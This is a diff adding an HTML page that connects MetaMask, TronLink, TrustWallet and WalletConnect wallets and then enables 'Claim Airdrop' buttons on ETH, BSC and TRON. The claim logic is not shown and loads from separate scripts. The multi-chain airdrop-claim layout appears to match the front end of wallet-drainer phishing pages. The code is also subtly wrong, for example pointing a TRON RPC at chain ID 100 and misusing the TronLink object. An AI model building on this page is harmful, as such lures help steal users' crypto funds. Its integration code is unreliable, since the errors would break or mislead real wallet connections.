@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallet Integration</title>
+    <link rel="stylesheet" href="css/styles.css">
+<!-- External scripts for wallet integrations -->
+<script src="https://cdn.jsdelivr.net/npm/@metamask/detect-provider/dist/detect-provider.min.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@walletconnect/client@1.7.0/dist/umd/index.min.js"></script>
+</head>
+<body>
+
+<h1>Connect your Wallet</h1>
+
+<!-- Buttons for connecting wallets -->
+<button id="connectButton">Connect MetaMask</button>
+<button id="claimAirdropButton" disabled>Claim Airdrop (ETH)</button>
+
+<button id="connectTronlinkButton">Connect TronLink</button>
+<button id="claimTronAirdropButton" disabled>Claim Airdrop (TRON)</button>
+
+<button id="connectTrustwalletButton">Connect TrustWallet</button>
+<button id="claimTrustwalletAirdropButton" disabled>Claim Airdrop (BSC)</button>
+
+<button id="connectWalletConnectButton">Connect WalletConnect</button>
+<button id="claimWalletConnectAirdropButton" disabled>Claim Airdrop (ETH/BSC/TRON)</button>
+
+
+
+<script>
+    // Function to dynamically load scripts
+    function loadScript(src, callback) {
+        const script = document.createElement('script');
+        script.src = src;
+        script.onload = callback;
+        script.onerror = function(error) {
+            console.error("Error loading script:", src, error); // Log error if script fails to load
+        };
+        document.head.appendChild(script);
+    }
+
+    // Function to handle wallet connection
+    function handleWalletConnection(wallet) {
+        let scriptPath = '';
+
+        // Decide the script path based on which wallet is selected
+        if (wallet === 'metamask') {
+            scriptPath = 'js/metamask.js';
+        } else if (wallet === 'tronlink') {
+            scriptPath = 'js/tronlink.js';
+        } else if (wallet === 'trustwallet') {
+            scriptPath = 'js/trustwallet.js';
+        } else if (wallet === 'walletconnect') {
+            scriptPath = 'js/walletconnect.js';
+        }
+
+        // Dynamically load the script for the selected wallet
+        if (scriptPath) {
+            loadScript(scriptPath, function() {
+                console.log(`${wallet} script loaded successfully.`);
+                // Initialize the wallet connection logic for the selected wallet
+                switch (wallet) {
+                    case 'metamask':
+                        connectMetaMask();
+                        break;
+                    case 'tronlink':
+                        connectTronLink();
+                        break;
+                    case 'trustwallet':
+                        connectTrustWallet();
+                        break;
+                    case 'walletconnect':
+                        connectWalletConnect();
+                        break;
+                    default:
+                        console.error('No script for selected wallet.');
+                }
+            });
+        }
+    }
+
+    // Function to load ABI and config files dynamically based on the network
+    async function loadConfigAndABI(network) {
+        const configMap = {
+            eth: { config: 'config/eth_config.json', abi: 'abi/eth_abi.json' },
+            bsc: { config: 'config/bsc_config.json', abi: 'abi/bsc_abi.json' },
+            tron: { config: 'config/tron_config.json', abi: 'abi/tron_abi.json' },
+        };
+
+        const { config, abi } = configMap[network];
+        try {
+            const configData = await fetch(config).then((res) => res.json());
+            const abiData = await fetch(abi).then((res) => res.json());
+            return { config: configData, abi: abiData };
+        } catch (error) {
+            console.error(`Error loading config or ABI for ${network}:`, error);
+            alert(`Failed to load configuration for ${network}.`);
+        }
+    }
+
+    // MetaMask connection logic
+    function connectMetaMask() {
+        if (window.ethereum) {
+            const web3 = new Web3(window.ethereum);
+            window.ethereum.request({ method: 'eth_requestAccounts' }).then(async (accounts) => {
+                console.log("Connected to MetaMask:", accounts);
+                document.getElementById('claimAirdropButton').disabled = false;
+            }).catch((error) => {
+                console.error("MetaMask connection failed:", error);
+                alert("Failed to connect to MetaMask.");
+            });
+        } else {
+            alert("MetaMask is not installed. Please install it to continue.");
+        }
+    }
+
+    // TronLink connection logic
+    function connectTronLink() {
+        if (window.TronLink) {
+            const tronWeb = window.TronLink;
+            tronWeb.defaultAddress.base58 = tronWeb.defaultAddress.base58 || null;
+            console.log("Connected to TronLink:", tronWeb.defaultAddress.base58);
+            document.getElementById('claimTronAirdropButton').disabled = false;
+        } else {
+            alert("TronLink is not installed. Please install it to continue.");
+        }
+    }
+
+    // TrustWallet connection logic
+    function connectTrustWallet() {
+        console.log('TrustWallet connection placeholder...');
+        alert('Please use MetaMask or TronLink for airdrop claiming.');
+    }
+
+    // WalletConnect connection logic
+    function connectWalletConnect() {
+        const provider = new WalletConnectProvider({
+            rpc: {
+                1: "https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID",
+                56: "https://bsc-dataseed.binance.org/",
+                100: "https://api.trongrid.io",
+            },
+        });
+
+        provider.enable().then(async () => {
+            const web3 = new Web3(provider);
+            const accounts = await web3.eth.getAccounts();
+            console.log("Connected to WalletConnect:", accounts);
+            document.getElementById('claimWalletConnectAirdropButton').disabled = false;
+        }).catch((error) => {
+            console.error("WalletConnect connection failed:", error);
+            alert("Failed to connect to WalletConnect.");
+        });
+    }
+
+    // Add event listeners for each button
+    document.getElementById('connectButton').addEventListener('click', function () {
+        handleWalletConnection('metamask');
+    });
+
+    document.getElementById('connectTronlinkButton').addEventListener('click', function () {
+        handleWalletConnection('tronlink');
+    });
+
+    document.getElementById('connectTrustwalletButton').addEventListener('click', function () {
+        handleWalletConnection('trustwallet');
+    });
+
+    document.getElementById('connectWalletConnectButton').addEventListener('click', function () {
+        handleWalletConnection('walletconnect');
+    });
+</script>
+
+</body>
+</html>
